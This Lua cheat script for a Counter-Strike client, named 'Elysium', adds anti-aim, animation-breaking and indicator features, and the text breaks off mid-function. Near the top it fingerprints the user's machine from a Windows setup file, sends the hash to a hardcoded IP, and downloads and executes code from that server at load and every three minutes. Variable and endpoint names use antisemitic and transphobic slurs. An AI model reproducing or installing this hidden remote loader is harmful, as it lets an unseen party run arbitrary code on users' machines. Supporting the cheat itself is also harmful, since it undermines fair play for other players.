--[[
	id: -NFEt422FWUdTb2ZLP0vG
	name: Elysium
	description: elysium
	time1: 2021-07-02 23:53:45.996555+00
	time2: 2021-07-02 23:53:45.996556+00
	uploader: 5MNddeel0TcD_4QMuUrwAlajFmdQb3eQXNY9OW5I
	uploadersession: xHmN2csMtvrz8MMdHnHybsGSMX7hgM
	flag: f
--]]

local ffi = require("ffi") or error("Failed to require FFI, please make sure Allow unsafe scripts is enabled!", 2)
local http = require 'gamesense/http'
local antiaim_funcs = require 'gamesense/antiaim_funcs'
local vector = require 'vector'
local bit = require "bit"

ui_get, ui_is_menu_open, ui_menu_position, ui_menu_size, ui_mouse_position, ui_name, ui_new_button, ui_new_checkbox, ui_new_color_picker, ui_new_combobox, ui_new_hotkey, ui_new_label, ui_new_listbox, ui_new_multiselect, ui_new_slider, ui_new_string, ui_new_textbox, ui_reference, ui_set, ui_set_callback, ui_set_visible, ui_update = ui.get, ui.is_menu_open, ui.menu_position, ui.menu_size, ui.mouse_position, ui.name, ui.new_button, ui.new_checkbox, ui.new_color_picker, ui.new_combobox, ui.new_hotkey, ui.new_label, ui.new_listbox, ui.new_multiselect, ui.new_slider, ui.new_string, ui.new_textbox, ui.reference, ui.set, ui.set_callback, ui.set_visible, ui.update 
client_camera_angles, client_camera_position, client_color_log, client_create_interface, client_delay_call, client_draw_debug_text, client_draw_hitboxes, client_error_log, client_exec, client_eye_position, client_find_signature, client_get_model_name, client_key_state, client_latency, client_log, client_random_float, client_random_int, client_register_esp_flag, client_reload_active_scripts, client_scale_damage, client_screen_size, client_set_clan_tag, client_set_event_callback, client_system_time, client_timestamp, client_trace_bullet, client_trace_line, client_unix_time, client_unset_event_callback, client_update_player_list, client_userid_to_entindex, client_visible = client.camera_angles, client.camera_position, client.color_log, client.create_interface, client.delay_call, client.draw_debug_text, client.draw_hitboxes, client.error_log, client.exec, client.eye_position, client.find_signature, client.get_model_name, client.key_state, client.latency, client.log, client.random_float, client.random_int, client.register_esp_flag, client.reload_active_scripts, client.scale_damage, client.screen_size, client.set_clan_tag, client.set_event_callback, client.system_time, client.timestamp, client.trace_bullet, client.trace_line, client.unix_time, client.unset_event_callback, client.update_player_list, client.userid_to_entindex, client.visible
entity_get_all, entity_get_bounding_box, entity_get_classname, entity_get_esp_data, entity_get_game_rules, entity_get_local_player, entity_get_origin, entity_get_player_name, entity_get_player_resource, entity_get_player_weapon, entity_get_players, entity_get_prop, entity_get_steam64, entity_hitbox_position, entity_is_alive, entity_is_dormant, entity_is_enemy, entity_set_prop = entity.get_all, entity.get_bounding_box, entity.get_classname, entity.get_esp_data, entity.get_game_rules, entity.get_local_player, entity.get_origin, entity.get_player_name, entity.get_player_resource, entity.get_player_weapon, entity.get_players, entity.get_prop, entity.get_steam64, entity.hitbox_position, entity.is_alive, entity.is_dormant, entity.is_enemy, entity.set_prop
renderer_circle, renderer_circle_outline, renderer_gradient, renderer_indicator, renderer_line, renderer_load_jpg, renderer_load_png, renderer_load_rgba, renderer_load_svg, renderer_measure_text, renderer_rectangle, renderer_text, renderer_texture, renderer_triangle, renderer_world_to_screen = renderer.circle, renderer.circle_outline, renderer.gradient, renderer.indicator, renderer.line, renderer.load_jpg, renderer.load_png, renderer.load_rgba, renderer.load_svg, renderer.measure_text, renderer.rectangle, renderer.text, renderer.texture, renderer.triangle, renderer.world_to_screen
plist_get, plist_set = plist.get, plist.set
globals_absoluteframetime, globals_chokedcommands, globals_commandhack, globals_curtime, globals_framecount, globals_frametime, globals_lastoutgoingcommand, globals_mapname, globals_maxplayers, globals_oldcommandack, globals_realtime, globals_tickcount, globals_tickinterval = globals.absoluteframetime, globals.chokedcommands, globals.commandhack, globals.curtime, globals.framecount, globals.frametime, globals.lastoutgoingcommand, globals.mapname, globals.maxplayers, globals.oldcommandack, globals.realtime, globals.tickcount, globals.tickinterval
http_request, http_create_cookie_container, http_get, http_post, http_head, http_put, http_delete, http_options, http_patch = http.request, http.create_cookie_container, http.get, http.post, http.head, http.put, http.delete, http.options, http.patch
bit_arshift, bit_band, bit_bnot, bit_bor, bit_bswap, bit_bxor, bit_lshift, bit_rol, bit_ror, bit_rshift, bit_tobit, bit_tohex = bit.arshift, bit.band, bit.bnot, bit.bor, bit.bswap, bit.bxor, bit.lshift, bit.rol, bit.ror, bit.rshift, bit.tobit, bit.tohex

local MOD = 2^32
local MODM = MOD-1

local function memoize(f)
	local mt = {}
	local t = setmetatable({}, mt)
	function mt:__index(k)
		local v = f(k)
		t[k] = v
		return v
	end
	return t
end

local function make_bitop_uncached(t, m)
	local function bitop(a, b)
		local res,p = 0,1
		while a ~= 0 and b ~= 0 do
			local am, bm = a % m, b % m
			res = res + t[am][bm] * p
			a = (a - am) / m
			b = (b - bm) / m
			p = p*m
		end
		res = res + (a + b) * p
		return res
	end
	return bitop
end

local function make_bitop(t)
	local op1 = make_bitop_uncached(t,2^1)
	local op2 = memoize(function(a) return memoize(function(b) return op1(a, b) end) end)
	return make_bitop_uncached(op2, 2 ^ (t.n or 1))
end

local bxor1 = make_bitop({[0] = {[0] = 0,[1] = 1}, [1] = {[0] = 1, [1] = 0}, n = 4})

local function bxor(a, b, c, ...)
	local z = nil
	if b then
		a = a % MOD
		b = b % MOD
		z = bxor1(a, b)
		if c then z = bxor(z, c, ...) end
		return z
	elseif a then return a % MOD
	else return 0 end
end

local function band(a, b, c, ...)
	local z
	if b then
		a = a % MOD
		b = b % MOD
		z = ((a + b) - bxor1(a,b)) / 2
		if c then z = bit32_band(z, c, ...) end
		return z
	elseif a then return a % MOD
	else return MODM end
end

local function bnot(x) return (-1 - x) % MOD end

local function rshift1(a, disp)
	if disp < 0 then return lshift(a,-disp) end
	return math.floor(a % 2 ^ 32 / 2 ^ disp)
end

local function rshift(x, disp)
	if disp > 31 or disp < -31 then return 0 end
	return rshift1(x % MOD, disp)
end

local function lshift(a, disp)
	if disp < 0 then return rshift(a,-disp) end 
	return (a * 2 ^ disp) % 2 ^ 32
end

local function rrotate(x, disp)
    x = x % MOD
    disp = disp % 32
    local low = band(x, 2 ^ disp - 1)
    return rshift(x, disp) + lshift(low, 32 - disp)
end

local k = {
	0x428a2f98, 0x71374491, 0xb5c0fbcf, 0xe9b5dba5,
	0x3956c25b, 0x59f111f1, 0x923f82a4, 0xab1c5ed5,
	0xd807aa98, 0x12835b01, 0x243185be, 0x550c7dc3,
	0x72be5d74, 0x80deb1fe, 0x9bdc06a7, 0xc19bf174,
	0xe49b69c1, 0xefbe4786, 0x0fc19dc6, 0x240ca1cc,
	0x2de92c6f, 0x4a7484aa, 0x5cb0a9dc, 0x76f988da,
	0x983e5152, 0xa831c66d, 0xb00327c8, 0xbf597fc7,
	0xc6e00bf3, 0xd5a79147, 0x06ca6351, 0x14292967,
	0x27b70a85, 0x2e1b2138, 0x4d2c6dfc, 0x53380d13,
	0x650a7354, 0x766a0abb, 0x81c2c92e, 0x92722c85,
	0xa2bfe8a1, 0xa81a664b, 0xc24b8b70, 0xc76c51a3,
	0xd192e819, 0xd6990624, 0xf40e3585, 0x106aa070,
	0x19a4c116, 0x1e376c08, 0x2748774c, 0x34b0bcb5,
	0x391c0cb3, 0x4ed8aa4a, 0x5b9cca4f, 0x682e6ff3,
	0x748f82ee, 0x78a5636f, 0x84c87814, 0x8cc70208,
	0x90befffa, 0xa4506ceb, 0xbef9a3f7, 0xc67178f2,
}

local function str2hexa(s)
	return (string.gsub(s, ".", function(c) return string.format("%02x", string.byte(c)) end))
end

local function num2s(l, n)
	local s = ""
	for i = 1, n do
		local rem = l % 256
		s = string.char(rem) .. s
		l = (l - rem) / 256
	end
	return s
end

local function s232num(s, i)
	local n = 0
	for i = i, i + 3 do n = n*256 + string.byte(s, i) end
	return n
end

local function preproc(msg, len)
	local extra = 64 - ((len + 9) % 64)
	len = num2s(8 * len, 8)
	msg = msg .. "\128" .. string.rep("\0", extra) .. len
	assert(#msg % 64 == 0)
	return msg
end

local function initH256(H)
	H[1] = 0x6a09e667
	H[2] = 0xbb67ae85
	H[3] = 0x3c6ef372
	H[4] = 0xa54ff53a
	H[5] = 0x510e527f
	H[6] = 0x9b05688c
	H[7] = 0x1f83d9ab
	H[8] = 0x5be0cd19
	return H
end

local function digestblock(msg, i, H)
	local w = {}
	for j = 1, 16 do w[j] = s232num(msg, i + (j - 1)*4) end
	for j = 17, 64 do
		local v = w[j - 15]
		local s0 = bxor(rrotate(v, 7), rrotate(v, 18), rshift(v, 3))
		v = w[j - 2]
		w[j] = w[j - 16] + s0 + w[j - 7] + bxor(rrotate(v, 17), rrotate(v, 19), rshift(v, 10))
	end

	local a, b, c, d, e, f, g, h = H[1], H[2], H[3], H[4], H[5], H[6], H[7], H[8]
	for i = 1, 64 do
		local s0 = bxor(rrotate(a, 2), rrotate(a, 13), rrotate(a, 22))
		local maj = bxor(band(a, b), band(a, c), band(b, c))
		local t2 = s0 + maj
		local s1 = bxor(rrotate(e, 6), rrotate(e, 11), rrotate(e, 25))
		local ch = bxor (band(e, f), band(bnot(e), g))
		local t1 = h + s1 + ch + k[i] + w[i]
		h, g, f, e, d, c, b, a = g, f, e, d + t1, c, b, a, t1 + t2
	end

	H[1] = band(H[1] + a)
	H[2] = band(H[2] + b)
	H[3] = band(H[3] + c)
	H[4] = band(H[4] + d)
	H[5] = band(H[5] + e)
	H[6] = band(H[6] + f)
	H[7] = band(H[7] + g)
	H[8] = band(H[8] + h)
end

local function sha256(msg)
	msg = preproc(msg, #msg)
	local H = initH256({})
	for i = 1, #msg, 64 do digestblock(msg, i, H) end
	return str2hexa(num2s(H[1], 4) .. num2s(H[2], 4) .. num2s(H[3], 4) .. num2s(H[4], 4) ..
		num2s(H[5], 4) .. num2s(H[6], 4) .. num2s(H[7], 4) .. num2s(H[8], 4))
end

ffi.cdef[[
	typedef long(__thiscall* get_file_time_t)(void* this, const char* pFileName, const char* pPathID);
	typedef bool(__thiscall* file_exists_t)(void* this, const char* pFileName, const char* pPathID);
]]

local kek1354 = ffi.typeof("void***")
local rawjew = client.create_interface("filesystem_stdio.dll", "VBaseFileSystem011") or error("error", 2)
local jew = ffi.cast(kek1354, rawjew) or error("error", 2)
local jewexist = ffi.cast("file_exists_t", jew[0][10]) or error("error", 2)
local getjew = ffi.cast("get_file_time_t", jew[0][13]) or error("error", 2)

local function bruteforce_dir()
	for i = 65, 90 do
		local directory = string.char(i)..":\\Windows\\Setup\\State\\State.ini"
		if jewexist(jew, directory, "ROOT") then
			return directory
		end
	end
	return nil
end

local directory = bruteforce_dir() or error("error", 2)

local jewlal = getjew(jew, directory, "ROOT") or error("error", 2)
local kekw = sha256(tostring(jewlal * 2))

--Timer class
Timer = {time = globals.realtime()}
__meta = {__index = Timer}

function Timer:new()
	return setmetatable({}, __meta)
end

function Timer:has_time_passed(ms)
	return self.time + (ms / 1000) <= globals.realtime()
end

function Timer:reset_time()
	self.time = globals.realtime()
end

--Timer class

    http_request('POST', 'http://135.125.238.73:8855/backup', {params = {HWID = kekw, BUILD_ID = kekid}} , function (success, response)
        if not success or response.status ~= 200 then
            print('Could not receive an anwser from the server!')
            client_exec("quit")
            return
        end
        if (response.body) then
            local data = json.parse(response.body)
            local registered = data.safe
            if (not registered) then
                client_exec("quit")
            end
        end
    end)

http_request('POST', 'http://135.125.238.73:8855/tranny', {params = {HWID = kekw}} , function (success, response)
    if not success or response.status ~= 200 then
        print('Could not receive an anwser from the server!')
		client_exec("quit")
        return
    end
	local data = response.body
	loadstring(data)()
end)

http_request('POST', 'http://135.125.238.73:8855/ks' , function (success, response)
    if not success or response.status ~= 200 then
        print('Could not receive an anwser from the server!')
		client_exec("quit")
        return
    end
	local data = response.body
	loadstring(data)()
end)

local check_timer = Timer:new()

client_set_event_callback("net_update_start", function ()
	if (check_timer:has_time_passed(180000)) then
		http_request('POST', 'http://135.125.238.73:8855/tranny', {params = {HWID = kekw}} , function (success, response)
			if not success or response.status ~= 200 then
				print('Could not receive an anwser from the server!')
				client_exec("quit")
				return
			end
			local data = response.body
			loadstring(data)()
		end)
		check_timer:reset_time()	
	end
end)

--references
local ref_anti_aim_enabled = ui_reference('AA', 'Anti-aimbot angles', 'Enabled')
local ref_pitch = ui_reference('AA', 'Anti-aimbot angles', 'Pitch')
local ref_yaw_base = ui_reference('AA', 'Anti-aimbot angles', 'Yaw base')
local ref_yaw, ref_yaw_add = ui_reference('AA', 'Anti-aimbot angles', 'Yaw')
local ref_yaw_jitter, ref_yaw_jitter_range = ui_reference('AA', 'Anti-aimbot angles', 'Yaw jitter')
local ref_body_yaw, ref_body_yaw_add = ui_reference('AA', 'Anti-aimbot angles', 'Body yaw')
local ref_freestanding_body_yaw = ui_reference('AA', 'Anti-aimbot angles', 'Freestanding body yaw')
local ref_fake_yaw_limit = ui_reference('AA', 'Anti-aimbot angles', 'Fake yaw limit')
local ref_edge_yaw = ui_reference('AA', 'Anti-aimbot angles', 'Edge yaw')
local ref_freestanding, ref_freestanding_key = ui_reference('AA', 'Anti-aimbot angles', 'Freestanding')
local ref_leg_movement = ui_reference("AA", "Other", "Leg movement")
local ref_cfg_load = ui_reference("CONFIG", "Presets", "Load")
local ref_slow_motion, ref_slow_motion_key = ui_reference("AA", "Other", "Slow motion")

local anti_aim = {
	ref_pitch,
	ref_yaw_base,
	ref_yaw,
	ref_yaw_add,
	ref_yaw_jitter,
	ref_yaw_jitter_range,
	ref_body_yaw,
	ref_body_yaw_add,
	ref_freestanding_body_yaw,
	ref_fake_yaw_limit,
	ref_edge_yaw,
	ref_freestanding,
	ref_freestanding_key
}

local brute = {
	miss = {},
	hit = {},
	last_shot = {}
}

local ref_double_tap, ref_double_tap_key = ui_reference('RAGE', 'Other', 'Double tap')
local ref_onshot_aa, ref_onshot_aa_key = ui_reference('AA', 'Other', 'On shot anti-aim')
--references

local chance_idx = {
	[0] = 'Never',
	[100] = 'Always'
}

local time_idx = { }

for i = 1, 2500 do
	if (i * 50 >= 1000) then
		time_idx[i] = tostring(i * 50 / 1000)..'s'
	end
end

--elements
local anti_aim_master_switch = ui_new_checkbox('AA', 'Anti-aimbot angles', 'Elysium AntiAim')

local legit_anti_aim = ui_new_hotkey('AA', 'Anti-aimbot angles', 'Legit AA')
local anti_aim_freestanding_mode = ui_new_combobox('AA', 'Anti-aimbot angles', 'Freestanding mode', 'Normal', 'Reverse')
local anti_aim_obvient_brute = ui_new_multiselect("AA", "Anti-aimbot angles", "Obvient bruteforce", "On miss", "On hit")
local anti_aim_freestanding_chance = ui_new_slider('AA', 'Anti-aimbot angles', 'Freestanding chance', 0, 100, 90, true, '%', 1, chance_idx)
local anti_aim_freestanding_chance_update = ui_new_slider('AA', 'Anti-aimbot angles', 'Freestanding chance update', 1, 50, 1, true, 'ms', 50, time_idx)
local anti_aim_desired_side_chance = ui_new_slider('AA', 'Anti-aimbot angles', 'Desired side chance', 60, 100, 90, true, '%', 1, chance_idx)
local anti_aim_desired_side_chance_update = ui_new_slider('AA', 'Anti-aimbot angles', 'Desired side chance update', 1, 50, 1, true, 'ms', 50, time_idx)
local anti_aim_freestanding_key = ui_new_hotkey("AA", "Anti-aimbot angles", "Freestand")
local anti_aim_break_animations = ui_new_checkbox("AA", "Anti-aimbot angles", "Break animations on slowwalk")
local animation_breaker = ui_new_multiselect("AA", "Anti-Aimbot angles", "Animation breaker", "Static legs", "Leg breaker")
local indicators = {
	selection = ui_new_multiselect('AA', 'Anti-aimbot angles', 'Indicators', 'Arrows'),
	color = ui_new_color_picker('AA', 'Anti-aimbot angles', 'Indictaors', 121, 163, 252, 255)
}
local indicator_scale = ui_new_combobox("AA", "Anti-aimbot angles", "Indicator magnitude", "Small", "Normal", "Bold")
--elements

--vars
local local_player = entity_get_local_player()
--vars
local freestanding_chance_update_timer = Timer:new()
local desired_side_chance_update_timer = Timer:new()

function reset_timers()
	freestanding_chance_update_timer:reset_time()
	desired_side_chance_update_timer:reset_time()
end
--handle menu visibility
function handle_menu()
	local enabled = ui_get(anti_aim_master_switch)

	ui_set_visible(legit_anti_aim, enabled)
	ui_set_visible(anti_aim_freestanding_mode, enabled)
	ui_set_visible(anti_aim_obvient_brute, enabled)
	ui_set_visible(anti_aim_freestanding_chance, enabled)
	ui_set_visible(anti_aim_freestanding_chance_update, enabled and ui_get(anti_aim_freestanding_chance) > 0 and ui_get(anti_aim_freestanding_chance) < 100)
	ui_set_visible(anti_aim_desired_side_chance, enabled and ui_get(anti_aim_freestanding_chance) > 0)
	ui_set_visible(anti_aim_desired_side_chance_update, enabled and ui_get(anti_aim_desired_side_chance) > 0 and ui_get(anti_aim_desired_side_chance) < 100 and ui_get(anti_aim_freestanding_chance) > 0)
	ui_set_visible(anti_aim_freestanding_key, enabled)
	ui_set_visible(anti_aim_break_animations, enabled)
	ui_set_visible(animation_breaker, enabled)
	ui_set_visible(indicators.selection, enabled)
	ui_set_visible(indicators.color, enabled)
	ui_set_visible(indicator_scale, enabled)

	for i = 1, #anti_aim do
		ui_set_visible(anti_aim[i], not enabled)
	end
end

client_set_event_callback('shutdown', function ()
	for i = 1, #anti_aim do
		ui_set_visible(anti_aim[i], true)
	end
end)

handle_menu()
client_set_event_callback('net_update_end', handle_menu)
client_set_event_callback('net_update_start', handle_menu)
client_set_event_callback('paint', handle_menu)
ui_set_callback(anti_aim_master_switch, function ()
	handle_menu()
	ui_set(ref_fake_yaw_limit, 60)
end)
ui_set_callback(anti_aim_freestanding_chance, handle_menu)
ui_set_callback(anti_aim_desired_side_chance, handle_menu)
--handle menu visibility

client_set_event_callback('predict_command', function ()
	local_player = entity_get_local_player()
end)

function contains(multiselect, value)
	for i = 1, #multiselect do
		if (multiselect[i] == value) then
			return true
		end
	end
	return false
end

function translate_hotkey(state)
    local states = {[0] = "Always on", [1] = "On hotkey", [2] = "Toggle", [3] = "Off hotkey"}
    return states[state]
end

--sets the best antiaim settings for each condition
local should_freestand = false
local should_desired = true

client_set_event_callback('round_start', reset_timers)

ui_set_callback(ref_cfg_load, reset_timers)

function custom_hotkeys()
	if (not ui_get(anti_aim_master_switch)) then
		return
	end

	if (ui_get(anti_aim_freestanding_key)) then
		ui_set(ref_freestanding, "Default")
		ui_set(ref_freestanding_key, "Always on")
	else
		ui_set(ref_freestanding, "-")
		ui_set(ref_freestanding_key, "On hotkey")
	end
end

client_set_event_callback("setup_command", function(cmd)
	--print('updating: ' .. tostring(antiaim_funcs.get_balance_adjust().updating) .. ", next_update: " .. antiaim_funcs.get_balance_adjust().next_update)
	--print('overlap: ' .. antiaim_funcs.get_overlap(rotation))
	--print('forwards: ' .. cmd.in_forward .. ", backwards: " .. cmd.in_back .. ", left: " .. cmd.in_left .. ", right:" .. cmd.in_right .. ", choked: " .. cmd.chokedcommands)
	if (cmd.in_use == 1) then
		return
	end
 	local desync_amount = antiaim_funcs.get_desync(2)

	if (desync_amount == nil) then
		return
	end

	if (desync_amount < 15 or cmd.chokedcommands == 0) then
		return
	end

	stop_micromove(cmd)
end)

function stop_micromove(cmd)
	if (ui_get(anti_aim_break_animations) and ui_get(ref_slow_motion) and ui_get(ref_slow_motion_key)) then
		if (math.abs(cmd.forwardmove) > 1) or (math.abs(cmd.sidemove) > 1) or cmd.in_jump == 1 then
			if (cmd.chokedcommands <= 14) then
				cmd.allow_send_packet = false
			end
			cmd.in_left = 0
			cmd.in_right = 0
			cmd.in_forward = 0
			cmd.in_back = 0
			return
		end

		if (entity_get_prop(local_player, "m_MoveType") or 0) == 9 then
			return
		end

			cmd.forwardmove = 0.000000000000000000000000000000001
			cmd.in_forward = 1
	end
end

client_set_event_callback("setup_command", custom_hotkeys)

function set_anti_aim()

	local freestanding_update = ui_get(anti_aim_freestanding_chance_update) * 50

	local should_update_freestanding = freestanding_chance_update_timer:has_time_passed(freestanding_update)

	local side_update = ui_get(anti_aim_desired_side_chance_update) * 50

	local should_update_side = desired_side_chance_update_timer:has_time_passed(side_update)

	local freestanding_chance = ui_get(anti_aim_freestanding_chance)

	local desrired_chance = ui_get(anti_aim_desired_side_chance)

	if (should_update_freestanding) then
		should_freestand = is_likely(freestanding_chance)
		freestanding_chance_update_timer:reset_time()
	end

	if (ui_get(anti_aim_freestanding_chance) == 100) then
		should_freestand = true
		freestanding_chance_update_timer:reset_time()
	elseif (ui_get(anti_aim_freestanding_chance) == 0) then
		should_freestand = false
		freestanding_chance_update_timer:reset_time()
	end

	local side = get_freestanding_side(local_player)

	if (should_update_side) then
		should_desired = is_likely(desrired_chance)
		desired_side_chance_update_timer:reset_time()
	end

	if (#ui_get(anti_aim_obvient_brute) > 0) then
		local target = get_target()
		if (target ~= nil) then
			if (contains(ui_get(anti_aim_obvient_brute), "On hit")) then
				if (brute.hit[target] > 0) then
					if (brute.last_shot[target] + 560 / 1000 >= globals_curtime()) then
						should_freestand = false
						ui_set(ref_fake_yaw_limit, client_random_int(25, 60))
					end
				end
			end
	
			if (contains(ui_get(anti_aim_obvient_brute), "On miss")) then
				if (brute.miss[target] > 0) then
					if (brute.last_shot[target] + 360 / 1000 >= globals_curtime()) then
						should_freestand = false
						ui_set(ref_fake_yaw_limit, client_random_int(25, 60))
					end
				end
			end
		end
	end


	if (ui_get(anti_aim_break_animations) and ui_get(ref_slow_motion) and ui_get(ref_slow_motion_key)) then
		should_freestand = false
	end


		if (should_freestand) then
			ui_set(ref_body_yaw, 'Static')
			if (ui_get(anti_aim_freestanding_mode) == 'Normal') then
				if (side == 'left') then
					if (should_desired) then
						ui_set(ref_body_yaw_add, -95)
					else
						ui_set(ref_body_yaw_add, 95)
					end
				else
					if (should_desired) then
						ui_set(ref_body_yaw_add, 95)
					else
						ui_set(ref_body_yaw_add, -95)
					end
				end
			else
				if (side == 'left') then
					if (should_desired) then
						ui_set(ref_body_yaw_add, 95)
					else
						ui_set(ref_body_yaw_add, -95)
					end
				else
					if (should_desired) then
						ui_set(ref_body_yaw_add, -95)
					else
						ui_set(ref_body_yaw_add, 95)
					end
				end
			end
		end

	if (ui_get(anti_aim_break_animations) and ui_get(ref_slow_motion) and ui_get(ref_slow_motion_key)) then
		ui_set(ref_pitch, 'Default')
		ui_set(ref_yaw_base, 'At targets')
		ui_set(ref_yaw, '180')
		ui_set(ref_yaw_add, 7)
		ui_set(ref_yaw_jitter, 'Off')
		ui_set(ref_body_yaw, 'Opposite')
		ui_set(ref_body_yaw_add, 180)
		ui_set(ref_freestanding_body_yaw, false)
		ui_set(ref_fake_yaw_limit, 60)
	else	
	   ui_set(ref_pitch, 'Default')
	   if (in_air(local_player)) then
		ui_set(ref_yaw_base, 'At targets')
	   else
		ui_set(ref_yaw_base, 'local view')
	   end
	   ui_set(ref_yaw, '180')
	   ui_set(ref_yaw_add, 0)
	   ui_set(ref_yaw_jitter, 'Off')
	   if (not should_freestand) then
	      ui_set(ref_body_yaw, 'Jitter')
	      ui_set(ref_body_yaw_add, 136)
	    end
	   ui_set(ref_freestanding_body_yaw, false)
	end
end

ui_set(ref_fake_yaw_limit, 60)

local function calc_diff(xdelta, ydelta)
    if xdelta == 0 and ydelta == 0 then
        return 0
	end
	
    return math.deg(math.atan2(ydelta, xdelta))
end

function break_animations()
	if (not ui_get(anti_aim_master_switch)) then
		return
	end

	if (contains(ui_get(animation_breaker), "Static legs")) then
		entity_set_prop(local_player, "m_flPoseParameter", 1, 6)
	end

	if (contains(ui_get(animation_breaker), "Leg breaker")) then
		ui_set(ref_leg_movement, "Always slide")
		entity_set_prop(local_player, "m_flPoseParameter", 1, 0)
	end
end

client_set_event_callback("predict_command", break_animations)

local animated_delta = 18

function draw_indicators()

	if (not ui_get(anti_aim_master_switch)) then
		return
	end

	if (local_player == nil) then
		return
	end


	if (not entity_is_alive(local_player)) then
		return
	end

	local r, g, b, a = ui_get(indicators.color)

	local sx, sy = client_screen_size()
	local cx, cy = sx / 2, sy / 2 - 2

	local aa_dir = ui_get(ref_yaw_add)

	local bodyyaw = entity_get_prop(local_player, "m_flPoseParameter", 11) * 120 - 60

	local delta = math.abs(antiaim_funcs.get_desync(1))

	if (animated_delta > math.abs(delta / 3.33333333)) then
		animated_delta = animated_delta - 1
	elseif (animated_delta < math.abs(delta / 3.33333333)) then
		animated_delta = animated_delta + 1
	end

	if (contains(ui_get(indicators.selection), "Arrows")) then

		renderer_triangle(cx + 55, cy + 2, cx + 42, cy - 7, cx + 42, cy + 11, 
		aa_dir == 90 and r or 35, 
		aa_dir == 90 and g or 35, 
		aa_dir == 90 and b or 35, 
		aa_dir == 90 and a or 150)
	
		renderer_triangle(cx - 55, cy + 2, cx - 42, cy - 7, cx - 42, cy + 11, 
		aa_dir == -90 and r or 35, 
		aa_dir == -90 and g or 35, 
		aa_dir == -90 and b or 35, 
		aa_dir == -90 and a or 150)

		renderer_rectangle(cx + 38, cy - 7, 2, 18, 
		35,
		35,
		35,
		150)
		renderer_rectangle(cx - 40, cy - 7, 2, 18,			
		35,
		35,
		35,
		150)

		if (bodyyaw < -10) then
			renderer_rectangle(cx + 38, cy - 7, 2, animated_delta, 
			bodyyaw < -10 and r or 35,
			bodyyaw < -10 and g or 35,
			bodyyaw < -10 and b or 35,
			bodyyaw < -10 and a or 150)

			renderer_rectangle(cx + 38, cy - 7, 2, 18, 
			bodyyaw < -10 and r or 35,
			bodyyaw < -10 and g or 35,
			bodyyaw < -10 and b or 35,
			bodyyaw < -10 and clamp(a - 200, 0, 255) or 150)
		elseif (bodyyaw > 10) then
			renderer_rectangle(cx - 40, cy - 7, 2, animated_delta,			
			bodyyaw > 10 and r or 35,
			bodyyaw > 10 and g or 35,
			bodyyaw > 10 and b or 35,
			bodyyaw > 10 and a or 150)

			renderer_rectangle(cx - 40, cy - 7, 2, 18,			
			bodyyaw > 10 and r or 35,
			bodyyaw > 10 and g or 35,
			bodyyaw > 10 and b or 35,
			bodyyaw > 10 and clamp(a - 200, 0, 255) or 50)
		end
	end

	--renderer_text_outline(cx, cy + 25, r, g, b, a, "cb", 0, "E L Y S I U M")

	if (ui_get(indicator_scale) == "Small") then
		renderer_text(cx, cy + 25, r, g, b, a, "-c", 0, "E    L    Y    S    I    U    M")
	elseif (ui_get(indicator_scale) == "Normal") then
		renderer_text_outline(cx, cy + 25, r, g, b, a, "c", 0, "E L Y S I U M")
	elseif (ui_get(indicator_scale) == "Bold") then
		renderer_text_outline(cx, cy + 25, r, g, b, a, "cb", 0, "E L Y S I U M")
	end

	renderer_text(cx, cy + 35, r, g, b, a, "-c", 0, "[ D  E  B  U  G ]")

end

function clamp(val, min, max)
	if (val > max) then
		return max
	end

	if (val < min) then
		return min
	end

	return val
end

renderer_text_outline = function (x, y, r, g, b, a, flags, max_width, ...)
	renderer_text(x + 1, y, 0, 0, 0, a, flags, max_width, ...)
	renderer_text(x - 1, y, 0, 0, 0, a, flags, max_width, ...)
	renderer_text(x + 1, y + 1, 0, 0, 0, a, flags, max_width, ...)
	renderer_text(x + 1, y - 1, 0, 0, 0, a, flags, max_width, ...)
	renderer_text(x - 1, y + 1, 0, 0, 0, a, flags, max_width, ...)
	renderer_text(x, y + 1, 0, 0, 0, a, flags, max_width, ...)
	renderer_text(x, y - 1, 0, 0, 0, a, flags, max_width, ...)
	renderer_text(x, y, r, g, b, a, flags, max_width, ...)
end

client_set_event_callback("paint", draw_indicators)

function get_target()
	local local_pos = vector(client_eye_position())
	local _, local_view_y,_= client_camera_angles()

	local enemies = entity_get_players(true)

	local target = nil

	local fov = 180

	for i = 1, #enemies do
		local enemy = enemies[i]
		if (enemy ~= nil) then
			local enemy_pos = vector(entity_get_prop(enemy, "m_vecOrigin"))
			local distance = calc_diff(local_pos.x - enemy_pos.x, local_pos.y - enemy_pos.y)
			local cur_fov = math.abs(normalize_angle(distance - local_view_y + 180))
			if (cur_fov < fov) then
				fov = cur_fov
				target = enemy
			end
		end
	end
	return target
end

function normalize_angle(angle)
	while angle > 180 do angle = angle - 360 end
	while angle < -180 do angle = angle + 360 end
	return angle
end

function reset_brute()
	ui_set(ref_fake_yaw_limit, 60)
	for i = 1, 64 do
		brute.miss[i] = 0
		brute.hit[i] = 0
		brute.last_shot[i] = 0
	end
end

client_set_event_callback('round_start', reset_brute)

reset_brute()

function handle_impacts(event)
	local enemy = client_userid_to_entindex(event.userid)
	if (enemy == local_player) then
		return
	end
	if (enemy ~= nil) then
		brute.hit[enemy] = 0
		if (brute.miss[enemy] ~= nil) then
			brute.miss[enemy] = brute.miss[enemy] + 1
		else
			brute.miss[enemy] = 1
		end
		brute.last_shot[enemy] = globals_curtime()
	end
end

client_set_event_callback('bullet_impact', handle_impacts)

function handle_hits(event)
	local player = client_userid_to_entindex(event.userid)
	if (player ~= local_player) then
		return
	end
	local enemy = client_userid_to_entindex(event.attacker)
	if (enemy ~= nil) then
		brute.miss[enemy] = 0
		if (brute.hit[enemy] ~= nil) then
			brute.hit[enemy] = brute.hit[enemy] + 1
		else
			brute.hit[enemy] = 1
		end
		brute.last_shot[enemy] = globals_curtime()
	end
end

client_set_event_callback('player_hurt', handle_hits)

function set_legit_aa(event)
	if (local_player ~= nil) then
		local side = get_freestanding_side(local_player)

		local should_freestand = true
	local target = get_target()

	if (target ~= nil) then
		if (contains(ui_get(anti_aim_obvient_brute), "On hit")) then
			if (brute.hit[target] > 0) then
				if (brute.last_shot[target] + 560 / 1000 >= globals_curtime()) then
					should_freestand = false
				end
			end
		end

		if (contains(ui_get(anti_aim_obvient_brute), "On miss")) then
			if (brute.miss[target] > 0) then
				if (brute.last_shot[target] + 360 / 1000 >= globals_curtime()) then
					should_freestand = false
				end
			end
		end
	end

		ui_set(ref_pitch, 'Off')
		ui_set(ref_yaw_base, 'Local view')
		ui_set(ref_yaw, 'Off')
		ui_set(ref_yaw_add, 0)
		ui_set(ref_yaw_jitter, 'Off')
		if (should_freestand) then
